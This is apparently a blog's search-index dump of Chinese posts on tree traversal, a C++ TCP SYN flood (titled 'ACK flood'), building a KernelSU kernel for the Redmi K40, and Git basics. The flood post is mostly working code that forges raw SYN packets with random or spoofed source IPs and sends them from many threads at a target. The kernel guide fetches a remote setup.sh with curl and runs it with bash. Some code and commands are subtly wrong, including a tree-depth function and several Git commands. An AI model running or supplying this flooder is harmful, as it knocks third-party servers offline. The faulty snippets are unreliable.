} 后序遍历\n步骤：若树为空，直接返回，否则从根节点开始先后序遍历左子树，再后序遍历右子树，最后访问根节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // 递归方式 void back_visit(TreeNode* node) { if (nullptr == node) { return; } back_visit(node-\u003eleft); back_visit(node-\u003eright); visit(node); } // 非递归方式 void back_visit(TreeNode* node) { if (nullptr == node) { return; } stack\u003cTreeNode*\u003e s; TreeNode* n = node, pre; bool flag; while (!s.empty() || n) { while (nullptr != n) { s.push(n); n = n-\u003eleft; } pre = nullptr, flag = true; while (!s.empty() \u0026\u0026 flag) { n = s.top(); if (n-\u003eright == pre) { s.pop(); visit(n); pre = n; }else { n = n-\u003eright; flag = false; } } } } 层序遍历\n步骤：若树为空，直接返回，否则从树第一层开始，从上往下，每一层从左往右访问节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 // 从第一层开始逐层打印，打印二叉树第K层，相当于以根节点左孩子为根节点，打印第 k - 1 层， // 然后以根节点右孩子为根节点，打印第 k - 1 层。 // 递归实现 void _level_visit(TreeNode* node, int level) { if (nullptr == node || level \u003c 1) { return; } if (level == 1) { visit(node); } _level_visit(node-\u003eleft, level - 1); _level_visit(node-\u003eright, level - 1); } // 计算二叉树层数 int getTreeDeepth(TreeNode* node) { if (nullptr == node) { return 0; } return std::max(getTreeDeepth(node-\u003eleft), getTreeDeepth(node-\u003eright) + 1); } void level_visit(TreeNode* node) { if (nullptr == node) { return; } // 计算二叉树层数 int deepth = getTreeDeepth(node); for (int i = 1; i \u003c= deepth; ++i) { _level_visit(node, i); } } // 非递归使用队列存储节点，先让根节点入队，然后访问节点并判断节点是否有左右孩子， // 有就入队，直到队列为空。 // 非递归实现 void level_visit(TreeNode* node) { if (nullptr == node) { return; } deque\u003cTreeNode*\u003e q; q.push_back(node); while (!q.empty()) { auto n = q.front(); q.pop_front(); visit(n); if (n-\u003eleft) { q.push_back(n-\u003eleft); } if (n-\u003eright) { q.push_back(n-\u003eright); } } } ","description":"","tags":["数据结构","笔记"],"title":"数据结构笔记，树","uri":"/posts/id/37zr0k7/"},{"categories":["posts"],"content":"TCP协议是互联网中一个最常用到的重要协议，比如平时用到的浏览器通信、APP数据通信等。\n攻击原理 TCP协议是一种可靠的传输协议，建立连接时客户端先发送SYN请求（SYN seq=x），服务器收到请求后会回复 ACK 应答（SYN seq=y, ACK=x + 1），客户端收到回应后会回复 ack 应答（ACK = y + 1），服务器收到后 TCP 连接正式建立，这就是TCP通信中的3次握手。而ACK洪水攻击就是利用服务器没收到ACK应答会不断重试连接（最多5次，每次间隔变大）的特点，在发送 SYN 请求之后便不做回应，导致服务器不断重复等待回应，占用大量套接字资源，最终使服务器宕机。\n实现过程 TCP数据包格式包含 IP首部、TCP首部和TCP数据：\nIP首部结构为：\nTCP首部结构为：\nTCP伪头部结构（用于计算校验和）：\n首先定义IP首部的结构体如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * IP 首部结构 * * | 版本(4) | 首部长度(4) | 服务类型TOS(8) | 总字节长度(16) | * | ID标识(16) | 标志(3) | 片偏移(13) | * | 生存时间TTL(8) | 协议(8) | 首部校验和(16) | * | 源IP地址(32) | * | 目的IP地址(32) | */ struct IPHeader { unsigned char version:4; // 版本 unsigned char header_len:4; // 首部长度 unsigned char tos:8; // 服务类型tos unsigned short total_len:16; // 总字节长度 unsigned short id:16; // ID unsigned short flags:16; // 标志和偏移 unsigned char ttl:8; // 生存时间 unsigned char protocol:8; // 协议 unsigned short checksum:16; // 首部校验和 unsigned int source:32; // 源IP地址 unsigned int target:32; // 目的IP地址 }; 定义TCP首部结构：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /** * TCP首部结构 * * | 源端口号(16) | 目的端口号(16) | * | 序列号(32) | * | 确认序号(32) | * | 首部长度(4) | 前6位保留标志(12) | 窗口大小(16) | * | 校验和(16) | 紧急指针(16) | * | 可选项 | * | 数据 | */ struct TCPHeader { unsigned short source_port:16; // 源端口 unsigned short target_port:16; // 目的端口 unsigned int seq:32; // 序号 unsigned int ack_seq:32; // 确认序号 unsigned char header_len:8; // 长度 unsigned char flag:8; // 标志 unsigned short win_len:16; // 窗口大小 unsigned short checksum:16; // 校验和 unsigned short urgent_ptr:16; // 紧急指针 }; 定义TCP伪造头部用于计算校验和：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** * TCP伪造头部 * * | 源地址(32) | * | 目的地址(32) | * | zero(8) | 协议(8) | TCP长度（16） | */ struct PseudoHeader { unsigned int source:32; // 源地址 unsigned int target:32; // 目的地址 unsigned char zero:8; // zeros unsigned char protocol:8; // 协议 unsigned short tcp_len:16; // TCP长度 }; 然后定义各种结构对应的初始化函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 // 初始化IP头部 void IPHeader::init(unsigned int source_address, unsigned int target_address) { int ip_len = sizeof(IPHeader); int tcp_len = sizeof(TCPHeader); // IPV4 协议 this-\u003eversion = 4; // 头部长度占 32字节多少个 this-\u003eheader_len = ip_len / sizeof(unsigned int); this-\u003etos = 0; // 本地转网络端 this-\u003etotal_len = htonl(ip_len + tcp_len); this-\u003eid = 1; this-\u003eflags = 0x40; this-\u003ettl = 255; this-\u003eprotocol = IPPROTO_TCP; // 暂时不进行计算 this-\u003echecksum = 0; this-\u003esource = source_address; this-\u003etarget = target_address; } // 初始化TCP头部 void TCPHeader::init(unsigned short tar_port) { // 随机端口 this-\u003esource_port = htons(std::rand() % 16383 + 49152); this-\u003etarget_port = htons(tar_port); // 随机请求号 this-\u003eseq = htonl(rand() % 9999999 + 250); this-\u003eack_seq = 0; this-\u003eheader_len = (sizeof(TCPHeader) / 4 \u003c\u003c 4 | 0); // SYN 位为1 this-\u003eflag = 0x02; this-\u003ewin_len = 0; this-\u003echecksum = 0; this-\u003eurgent_ptr = 0; } // TCP伪造头部初始化 void PseudoHeader::init(unsigned int source_address, unsigned int target_address) { this-\u003ezero = 0; this-\u003eprotocol = IPPROTO_TCP; this-\u003etcp_len = htons(sizeof(TCPHeader)); this-\u003esource = source_address; this-\u003etarget = target_address; } 校验和代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 校验和 static unsigned short checksum(unsigned short* buffer, unsigned short size) { unsigned long checksum = 0; while (size \u003e 1) { checksum += *buffer++; size -= sizeof(unsigned short); } if (size) { checksum += *(unsigned char*)(buffer); } checksum = (checksum \u003e\u003e 16) + (checksum \u0026 0xffff); checksum += (checksum \u003e\u003e 16); return (unsigned short )(~checksum); } 使用多线程攻击：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 /** * SYN攻击 * 线程数量，目标地址，目标端口 **/ bool syn_attack(unsigned int thread_count, unsigned int target_address, unsigned short target_port) { std::vector\u003cstd::thread\u003e ths; for (auto i = 0; i \u003c thread_count; ++i) { ths.emplace_back([](unsigned int target, unsigned short port){ unsigned int source = 0; unsigned int index = 0; // 全局原子量 while (g_run_flag.load()) { // 判断代理IP是否为空 if (g_source_ip.empty()) { source = std::rand(); } else { source = g_source_ip[index]; index = (index + 1) % g_source_ip.size(); } // 构造原始套接字 int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { #ifdef DEBUG fprintf(stderr, \"创建原始套接字失败!\\n\"); #endif continue; } { int on = 1; if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char*)\u0026on, sizeof(on)) \u003c 0) { close(fd); continue; } } sockaddr_in skaddr; std::array\u003cchar, 256\u003e send_buf{}; send_buf.fill(0); int send_buf_len; memset(\u0026skaddr, 0, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = target; // 构造SYN数据包 { std::array\u003cchar, 128\u003e buf{}; buf.fill(0); IPHeader ip{}; TCPHeader tcp{}; PseudoHeader pseudo{}; send_buf_len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 ip.init(source, target); tcp.init(port); pseudo.init(source, target); // 计算IP校验和 ip.checksum = checksum((unsigned short*)\u0026ip, sizeof(ip)); // 计算TCP校验和 memcpy(buf.data(), \u0026pseudo, sizeof(pseudo)); memcpy(buf.data() + sizeof(pseudo), \u0026tcp, sizeof(tcp)); tcp.checksum = checksum((unsigned short*)buf.data(), send_buf_len); // 拷贝SYN数据包 IP头部+TCP头部 memcpy(send_buf.data(), \u0026ip, sizeof(ip)); memcpy(send_buf.data() + sizeof(ip), \u0026tcp, sizeof(tcp)); } // 发送数据包 sendto(fd, send_buf.data(), send_buf_len, 0, (sockaddr *)\u0026skaddr, sizeof(sockaddr)); } }, target_address, target_port); } for (auto\u0026 it : ths) { if (it.joinable()) { it.join(); } } } ","description":"","tags":["Code","网络安全","C++","日常"],"title":"C++ 实现 ACK洪水攻击","uri":"/posts/id/a0c57b/"},{"categories":["posts"],"content":" KernelSU 出来已经有一段时间，从原来只支持 5.x 内核的GKI内核到现在支持 4.x 内核，更多手机（特别是非GKI）可以通过自行编译内核获得体验。本文就以红米K40手机(内核版本4.19)为例，简单记录一下在 Windows 下通过 WSL2 编译内核，并支持 KernelSU 的大致步骤。\n本文不是小白文章，按照这篇文章操作不一定能够成功，但是自己一步步操作，并通过百度等途径学习比如 Linux 命令行操作、Shell脚本编写等技能，最终编译出自己的内核是很有成就感的，或许就是这一次的成功，你将成为下一个内核高手！记住善于搜索引擎、ChatGPT、Github等。\n1. WSL2环境搭建 Windows下 WSL2 环境搭建不在本文章范围内，请参考 微软官方教程 。\n安装好 WSL2 后，到微软商店下载 Ubuntu 并安装初始化完成，Ubuntu尽量选择新一点的版本，软件包更新，之后可以在 Windows Terminal 直接使用 wsl -d Ubuntu 进入 WSL2 Ubuntu系统：\n2. 编译环境搭建 安装基础软件包\n1 2 3 4 5 sudo apt install -y bc bison build-essential curl flex g++-multilib gcc-multilib \\ git gnupg gperf imagemagick lib32ncurses5-dev lib32readline-dev \\ lib32z1-dev liblz4-tool libncurses5 libncurses5-dev libsdl1.2-dev \\ libssl-dev libxml2 libxml2-utils lzop pngcrush schedtool \\ squashfs-tools xsltproc zip zlib1g-dev unzip python2 prochains 配置代理\n鉴于目前国内很多地方存在 Github 污染，强烈建议配置好代理，如果你当前地区支持 Github 裸连接则可以跳过这个步骤。这里使用 proxychains 这个终端代理工具配置，代理工具请自行搭建。要看当前区域是否能连接 Github ，不使用代理在浏览器访问 https://github.com 看看能不能正常访问即可。\nproxychains 工具配置文件在 /etc/proxychains.conf 文件，使用 vim 编辑文件：\n1 2 3 4 5 # 查看 Windows 本机IP，显示的 nameserver 即为本机IP，代理服务器需要 cat /etc/resolv.conf # 编辑 proxychains文件，并添加对应配置 # 格式: 代理协议 代理服务器IP(这里为Windows本机IP) 代理服务器端口(可在自己代理工具查看) sudo vim /etc/proxychains.conf 比如我的配置：\n代理配置好之后可以使用：proxychains \u003ccommand\u003e 执行 command 命令，command是指具体命令，比如使用代理下载文件：proxychains wget xxx.zip 。\n下载设备能使用的内核源码\n这个可以到 Github 自行搜索，如果你的机型有类原生就简单了，到对应类原生项目源码仓库搜索你设备的内核源码即可。\nGit 使用可以看这篇：Git基本使用 | TicksBlog 。\n我这里使用 Development - KERNEL (AOSP/MIUI) N0Kernel 2.4 | XDA Forums 为例：\n1 2 3 4 5 6 7 # 导航到用户根目录 cd ~ # 创建目录用来存放内核源码和一些编译工具 mkdir Kernel \u0026\u0026 cd Kernel # 克隆 T 分支源码到当前目录下K40-N0目录，--depth=1只包含最近一次的提交信息，可以加快克隆 # 如果你使用代理工具记得在命令前面加上 proxychains git clone -b T --depth=1 https://github.com/EmanuelCN/kernel_xiaomi_sm8250.git K40-N0 下载 aarch64 编译工具\n这里使用 clang 编译，较老的内核可能无法只使用 clang 编译，需要配合 gcc 编译。\n下载 zyc-clang-14 ：\n1 2 3 4 # 确保当前工作区在 ~/Kernel mkdir toolchains \u0026\u0026 cd toolchains # 克隆zyc-clang-14工具, 使用代理记得加 proxychains ，后面不再提示 git clone --depth=1 https://github.com/EmanuelCN/zyc_clang-14.git zyc-clang 下载 KernelSU 源码和 AnyKernel3 工具\n1 2 3 4 5 6 7 8 # 确保当前在 ~/Kernel 目录 # 进入内核源码目录 cd K40-N0 # 下载 KernelSU脚本并执行 curl -o kernelsu-setup.sh \"https://raw.githubusercontent.com/tiann/KernelSU/main/kernel/setup.sh\" bash kernelsu-setup.sh # 下载Anykernel3工具 git clone --depth=1 https://github.com/osm0sis/AnyKernel3.git 现在你工作区目录结构应该是这样：\n1 2 3 4 5 6 7 Kernel ---- K40-N0 -------- AnyKernel3 -------- KernelSU -------- 内核文件 ---- toolchains -------- zyc-clang 3. KernelSU 非GKI补丁设置 默认情况下，KernelSU 对于 4.x 内核使用 kprobe 机制做内核相关 hook ，不过在一些内核中 kprobe 有问题，会导致内核刷入后无法开机，如果不确定当前内核 kprobe 是否正常工作可以使用官方提供的参考补丁，建议先使用 kprobe 看看是否能开机，如果不能开机再使用补丁方式，kprobe 能工作更好，毕竟不用手动修改内核源码，省去很多麻烦。\nkprobe设置 修改 defconfig 文件：\n1 2 3 4 5 6 7 8 9 # 确保当前在内核源码根目录 # 编辑 defconfig文件 vim arch/arm64/configs/vendor/alioth_defconfig # 确保有以下配置 CONFIG_KPROBES=y CONFIG_HAVE_KPROBES=y CONFIG_KPROBE_EVENTS=y # kprobe 依赖这个，部分内核没有启用，不启用编译时会报错 CONFIG_MODULES=y 建议先使用 vim 自带搜索功能查看是否有配置，没有配置则添加，如果有类似 # CONFIG_KPROBES is not set 文本，则取消注释变为：CONFIG_KPROBES=y 。\n打补丁（kprobe无法开机时才需要使用） 如果只使用 kprobe 能开机则不需要手动修改源码，已知 N0Kernel v2.4 需要手动打补丁，补丁可以参考 如何为非 GKI 内核集成 KernelSU | KernelSU 。\n4. 编译脚本编写 由于内核编译时参数和环境变量较多，通常都会写一个脚本文件，每次编译只需要简单修改下脚本，然后一键编译即可，编译 N0 内核配置文件如下，可以参考，不能照搬！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 #!/bin/bash ########################### # a kernel build script ########################### ## # some color setting ## cinfo=\"\\x1b[38;2;79;155;250m\" cwarn=\"\\x1b[38;2;255;200;97m\" cerror=\"\\x1b[38;2;240;96;96m\" cno=\"\\x1b[0\" echo -e \"${cinfo}=============== Setup Some Export ===============${cno}\" # 内核工作目录 export KERNEL_DIR=$(pwd) # 内核 defconfig 文件 export KERNEL_DEFCONFIG=vendor/alioth_defconfig # 编译临时目录，避免污染根目录 export OUT=out # anykernel3 目录 export ANYKERNEL3=${KERNEL_DIR}/AnyKernel3 # 内核 zip 刷机包名称 export KERNEL_ZIP_NAME=\"N0-KSU_Alioth_2.4.0.zip\" # 刷机包打包完成后移动目录 export KERNEL_ZIP_EXPORT=\"/home/ticks/Kernel\" # clang 绝对路径 export CLANG_PATH=/home/ticks/Kernel/toolchains/zyc-clang export PATH=${CLANG_PATH}/bin:${PATH} export CLANG_TRIPLE=aarch64-linux-gnu- # arch平台，这里时arm64 export ARCH=arm64 export SUBARCH=arm64 # 只使用clang编译需要配置 export LLVM=1 export BUILD_INITRAMFS=1 # 编译时线程指定，默认单线程，可以通过参数指定，比如4线程编译 # ./build.sh 4 TH_COUNT=1 if [[ \"\" != \"$1\" ]]; then TH_NUM=$1 fi # 编译参数 export DEF_ARGS=\"O=${OUT} \\ CC=clang \\ CXX=clang++ \\ ARCH=${ARCH} \\ CROSS_COMPILE=${CLANG_PATH}/bin/aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=${CLANG_PATH}/bin/arm-linux-gnueabi- \\ LD=ld.lld \" export BUILD_ARGS=\"-j${TH_COUNT} ${DEF_ARGS}\" echo -e \"${cwarn}kernel workspace dir is =\u003e ${KERNEL_DIR}\" echo -e \"kernel build defonfig is =\u003e ${KERNEL_DEFCONFIG}\" echo -e \"build tmpdir is =\u003e ${KERNEL_DIR}/${OUT}\" echo -e \"anykernel3 workspace dir is =\u003e ${ANYKERNEL3}\" echo -e \"kernel zip name is =\u003e ${KERNEL_ZIP_NAME}\" echo -e \"kernel zip export dir is =\u003e ${KERNEL_ZIP_EXPORT}\" echo -e \"clang path is =\u003e ${CLANG_PATH}\" echo -e \"build arch/subarch is =\u003e ${ARCH} / ${SUBARCH}${cno}\" # 等待10s，查看配置文件信息是否正确，不正确 Ctrl + C 及时取消 sleep 10s echo -e \"${cinfo}=============== Make defconfig ===============${cno}\" # make defconfig make ${DEF_ARGS} ${KERNEL_DEFCONFIG} # 如果命令没有出错，继续执行，否则退出编译 if [[ \"0\" != \"$?\" ]]; then echo -e \"${cerror}\u003e\u003e\u003e make defconfig error, build stop!${cno}\" exit 1 fi echo -e \"${cinfo}=============== Make Kernel ===============${cno}\" make ${BUILD_ARGS} if [[ \"0\" != \"$?\" ]]; then echo -e \"${cerror}\u003e\u003e\u003e build kernel error, build stop!${cno}\" exit 1 fi echo -e \"${cwarn}\u003e\u003e\u003e build kernel success${cno}\" sleep 3s # 使用 Anykernel3 制作刷机包 echo -e \"${cinfo}=============== Make Kernel Zip ===============\" if test -e ${ANYKERNEL3}; then if test -e ${KERNEL_DIR}/${OUT}/arch/${ARCH}/boot/dtbo.img; then if test -e ${KERNEL_DIR}/${OUT}/arch/${ARCH}/boot/Image.gz-dtb; then echo -e \"${cwarn}move kernel files . . .${cno}\" cp ${KERNEL_DIR}/${OUT}/arch/${ARCH}/boot/dtbo.img ${ANYKERNEL3}/ cp ${KERNEL_DIR}/${OUT}/arch/${ARCH}/boot/Image.gz-dtb ${ANYKERNEL3}/ echo -e \"${cwarn}into anykernel3 workdir. . .\" cd ${ANYKERNEL3} if test -e ./Image.gz-dtb; then zip -r ${KERNEL_ZIP_NAME} ./* test -e ./${KERNEL_ZIP_NAME} \u0026\u0026 mv ./${KERNEL_ZIP_NAME} ${KERNEL_ZIP_EXPORT} echo -e \"${cwarn} clean kernel files. . .${cno}\" test -e ./Image.gz-dtb \u0026\u0026 rm ./Image.gz-dtb test -e ./dtbo.img \u0026\u0026 rm ./dtbo.img else echo -e \"${cerror}stopmake =\u003e kernel file not found!${cno}\" exit 1 fi else echo -e \"${cerror}stop make =\u003e Image.gz-dtb not found${cno}\" exit 1 fi else echo -e \"${cerror}stop make =\u003e dtbo.img not found${cno}\" exit 1 fi else echo -e \"${cerror}stop build =\u003e anykernel3 dir not found${cno}\" exit 1 fi exit 0 这个脚本可以编译内核并自动生成刷机包，Anykernel3 需要自行修改脚本文件，并不是所有手机都能使用官方脚本，使用方法可以参考：Anykernel3 Github 。\nK40 可以这样配置，我参考的 crdroid 内核的 Anykernel3 配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 ### AnyKernel3 Ramdisk Mod Script ## osm0sis @ xda-developers ### AnyKernel setup # begin properties properties() { ' kernel.string=N0Kernel-KSU by ticks do.devicecheck=1 do.modules=0 do.systemless=1 do.cleanup=1 do.cleanuponabort=0 device.name1=alioth device.name2=aliothin device.name3= device.name4= device.name5= supported.versions= supported.patchlevels= '; } # end properties ### AnyKernel install # begin attributes attributes() { set_perm_recursive 0 0 750 750 $ramdisk/*; } # end attributes ## boot shell variables block=/dev/block/bootdevice/by-name/boot; is_slot_device=1; ramdisk_compression=auto; # import functions/variables and setup patching - see for reference (DO NOT REMOVE) . tools/ak3-core.sh \u0026\u0026 attributes; # boot install dump_boot; # use split_boot to skip ramdisk unpack, e.g. for devices with init_boot ramdisk if [ -d $ramdisk/overlay ]; then rm -rf $ramdisk/overlay; fi; write_boot; # use flash_boot to skip ramdisk repack, e.g. for devices with init_boot ramdisk ## end boot install 内核编译 脚本文件写好后编译就很方便了，执行 chmod +x build.sh \u0026\u0026 ./build.sh ，等待内核编译完成，没有报错就可以将 zip刷机包 移动到Windows目录刷入了。\nWindows c、d、e盘都挂载在 /mnt/c 、/mnt/d 等目录，比如移动文件到 D盘根目录：mv ./N0-KSU_Alioth.zip /mnt/d/ 。\n","description":"","tags":["Android","日常","折腾"],"title":"红米K40内核KernelSU编译","uri":"/posts/id/ef0vy/"},{"categories":["posts"],"content":"Git安装 Windows安装 Git 官网提供了Windows的一键安装程序，只需要前往下载然后按照提示进行安装即可。Git安装程序下载 地址 ：https://git-scm.com/downloads/win\n安装之后会自动加入环境变量，重启系统之后即可使用Git，同时右键菜单也会出现 Git Bash 选项，可以在当前目录打开 Git 的命令行进行操作。\nLinux安装 由于 Linux 软件安装的特殊性，大多发行版软件仓库中都有 git ，可以使用软件安装命令进行安装，比如 Ubuntu：sudo apt install git ，ArchLinux：sudo pacman -S git 等。 同样安装之后也会自动加入环境变量，可以直接使用 git --version 查看 git 版本。\n你还可以直接下载源码进行编译安装，下载地址：https://git-scm.com/downloads/linux\n编译安装需要一些依赖包，比如：ssl 、gettext 、curl 等软件包，安装依赖后便可以解压源码，然后进行编译安装：\n1 2 3 4 5 6 7 8 # 解压源码压缩文件 tar -zxf git-xxx.tar.gz # 进入源码目录 cd git-xxx # 使用make编译 make prefix=/usr/local all # 安装编译后的文件 sudo make prefix=/usr/local install Git配置 第一次使用 Git 需要进行一些全局配置，方便以后使用。\n配置用户名以及邮箱 当使用 Git 提交推送时需要用到，这样会将我们的信息显示到提交信息上面。\n1 2 3 4 5 # 配置用户名 git config --global user.name \"用户名(昵称)\" # 配置邮箱 git config --global user.email \"邮箱\" # --global 用于全局有效，如果当前git目录没有指明，就会使用这个全局的 配置编辑器 Git 使用中，某些情况需要手动修改一些内容或信息，这时需要使用编辑器，配置默认的编辑器可以让我们自己决定处理冲突或者合并的时候用什么编辑器打开，比如 vim 、emacs 、vscode 等。\n1 2 # 配置默认编辑器为vim git config --global core.editor vim 一般情况只需要这几个配置即可，更多配置参考：Git Config 。配置完之后可以使用 git config --list 列出已有的配置。\n如果需要删除指定的配置可以使用 git config --global unset \u003ckey\u003e 来删除 \u003ckey\u003e 对应配置，比如全局删除用户邮箱配置： git config --global unset user.email\nGit基础命令 Git 工作流程如下：\nGit 各概念 首先 git 作为版本管理工具有几个重要概念：工作区 、暂存区 、本地仓库 、远程仓库 。\n工作区：工作区就是我们看到的目录，每个Git仓库都有一个目录，而目录下的各个文件就是我们的工作区，平时修改代码和文件的地方。\n暂存区：暂存区是Git 目录下 .git 目录内的文件，我们添加文件到 Git 之后，也就相当于添加到暂存区了，这时候还没有正式存入本地仓库，Git 提供了对工作区文件的跟踪功能(修改、添加、删除等都会被检测到)，添加到暂存区的内容才可以在后面提交到本地仓库保存。\n本地仓库：本地仓库就是 Git 在本地管理文件的地方，文件添加到暂存区之后，经过考虑之后便可以提交到本地仓库，这时候便将当前工作区需要交由Git管理的文件快照保存了一份到本地仓库，同时还附带了很多信息，方便我们对不同版本之间的文件进行管理。\n远程仓库：远程仓库是我们存放在其他地方(通常是在有Git管理的服务器上面)的内容，远程仓库可以很方便的进行多人修改开发，同时也在一定程度上保证了数据安全，Git 是分布式版本管理系统，所以远程仓库与本地仓库并无多大区别，只是存放的位置不同。\nGit 初始化本地仓库 如果要使用 Git 版本管理，需要先在本地目录下初始化 Git ，来生成一个 .git 的目录，用来存放 Git 以及仓库的各种信息，任何时候都不应该手动去修改这个目录。\n1 2 # 初始化当前目录，使用Git版本管理 git init Git 添加文件 每一次修改或者添加完文件，在提交前都需要将文件提交到暂存区，可以使用 git add [文件名或目录] 来添加文件到暂存区。如果文件很多，要一个个添加会很麻烦，我们可以直接使用 git add . 来将当前目录下所有文件添加到暂存区( . 在 Linux 下表示当前目录 )，这样就会省事很多。\n但是这样很可能添加一些我们不想管理的文件，比如 ide 编译的 debug 文件，日志文件，临时文件等等，好在 Git 也考虑到这个问题，我们可以在Git管理根目录下新建 .gitignore 文件来说明 Git add 时要忽略的文件，之后便可以安全的使用 git add . 了。\nGit 删除文件 在工作区中删除了文件，在 Git 管理中并没有对其删除，也就是说在本地仓库仍然存在这个文件，我们需要使用 git rm \u003c文件\u003e 来进行删除，这样会将删除记录到 Git ，在下次提交时会对本地仓库进行更改，实现真正删除。\n如果仅需要删除暂存区中文件，本地文件不需要删除，可以使用 git rm --cache \u003c文件\u003e ，强制删除本地和暂存区文件可以使用 git rm -f \u003c文件\u003e 。\n如果在本地工作区删除了大量文件，通过一个一个使用 git rm \u003c文件\u003e 删除很麻烦，可以在提交时使用 git commit -am \"提交信息\" 来快速删除。\nGit 提交到本地仓库 修改完文件后添加到暂存区，最后还需要进行提交，然后才能真正保存进本地仓库，每次提交都要求提供 提交信息 ，这样可以方便我们查看这次对文件的修改，一般提交信息简洁明了最好。\n1 2 # 提交文件并指定提交信息 git commit -m \"提交信息\" Git 回退版本 Git 中有一个 HEAD 指向当前版本和状态，每一次提交版本都会自动生成一个唯一索引值，可以使用 git log 来查看所有提交，每一个提交前都有一串字母数字组合，通过使用 git reset \u003cHEAD\u003e 可以回滚到指定 HEAD 的提交版本。\nGit 回滚有几个重要的模式，比如 hard 、merged 、keep ：\nhard git reset --hard \u003cHEAD\u003e 会在回退版本时完全恢复工作区文件，如果回滚前还有未提交的文件将在回滚之后被删除，--hard 会保证工作区文件与回滚版本内容相同。\nmerged git rest --merged \u003cHEAD\u003e 会在回滚之后对工作区文件进行合并，如果有修改但还没有提交的文件，会在回滚之后进行合并。\nkeep git reset --keep \u003cHEAD\u003e 会在回滚之后保持原来工作区不变。\nGit 添加标签 有时候我们需要经常回滚到指定提交，每次都使用 git log 查看一长串索引非常麻烦，可以使用 git tag -a \u003ctag\u003e -m \"标签信息\" 在当前提交处打上一个标签，这样就可以很方便的切换到指定标签处：git reset --hard \u003ctag\u003e 。\ntag 最常用的地方就是发行指定Release版本，其他人可以很方便的切换到指定版本，比如切换到 v6.0 版本：git reset --hard v6.0 。\n使用 git tag 可以查看当前分支所有标签，使用 git show \u003ctag\u003e 可以查看具体标签的详细信息，使用 git -d \u003ctag\u003e 可以删除指定标签。\n默认标签不会提交到远程仓库，具体操作可查看 Git远程 部分。\nGit分支 Git 具有分支的概念，初次创建初始化 Git 时会默认创建一个主分支，可以看作是游戏中的主线任务，而分支可以看作游戏中的支线任务，分支与其他分支独立，但是保留有创建分支之前的所有提交记录。\n查看分支 使用 git branch 可以查看当前有哪些分支，默认应该只有一个 master 分支。\n创建与切换分支 创建分支可以使用 git branch 分支名字 来创建指定分支。\n切换分支使用 git checkout 分支名字 。\n创建分支并立刻切换到新创建的分支可以使用 git branch -b 分支名字 。\n修改和删除分支 修改分支名字可以使用 git branch -m 旧分支 新分支 。\n删除分支使用 git branch -d 分支 。\n合并分支 分支作用可以用于临时开发一些新功能或者修复一些bug，之后需要合并到主分支完成分支功能开发，要合并分支需要先切换到要合并到的分支，一般为主分支，然后进行合并操作。\n1 2 3 4 5 # 假设现在有两个分支 master 和 dev，当前在 dev 分支 # 切换到主分支 git checkout master # 合并 dev 分支到当前分支(主分支) git merge dev 有时合并会出现冲突，会导致合并失败，比如 两个分支都对同一个文件同一行进行了修改，合并时 Git 不知道需要保留哪一个修改，我们就需要手动进行保留，然后再进行提交。\nGit远程 Git 远程用于多人开发时远程仓库保存代码，所有人都在完成工作后提交到远程，需要时从远程同步其他人做的修改。\n查看远程 使用 git remote 可以查看当前 Git 库有哪些远程，git remote -v 可以显示更详细内容。\n添加远程 使用 git remote add 远程名字(昵称) 远程地址 。\n远程推送 在本地提交后不会同步到远程，如果要同步到远程仓库，需要使用 git push 远程名字 本地分支:远程分支 来将本地分支推送到远程对应分支。\n如果不指明远程分支，就与本地分支相同，比如：\n1 2 3 4 # 将本地master分支推动到远程origin的master分支 git push origin master:master # 缩写 git push origin master 如果嫌每次推送输入内容太多且重复，可以将本地分支与远程分支绑定：git push --set-upstream 远程 本地分支 。这样就可以在提交时直接使用 git push 。\n远程拉取 如果要同步远程提交到本地仓库，可以使用 git fetch 远程 来从远程同步代码。但是这样只会更新本地仓库，不会更新本地工作区，如果需要更新本地工作区，可以将远程仓库同步的提交合并到当前分支。\n1 2 3 4 5 # 从远程 origin 同步代码 git fetch origin # 现在本地分支提交为 master，远程同步的为 origin/master，且领先本地分支 # 现在进行合并 git merge origin/master 上面的步骤可以通过 git pull 远程 一步完成。\n远程克隆 远程克隆从远程地址克隆一份到本地，一般用于第一次下载仓库，耗时最久，之后如果需要更新代码可以使用 git fetch 或 git pull 更新，耗时更短。\n1 2 3 # 克隆远程链接的仓库到本地目录 git clone 远程链接 本地目录名称 # 如果不指定本地目录名，默认使用远程仓库名称 **提交标签到远程 ** 默认情况下，git push 不会把本地标签推送到远程，只能显示指定要提交的标签：git push 远程 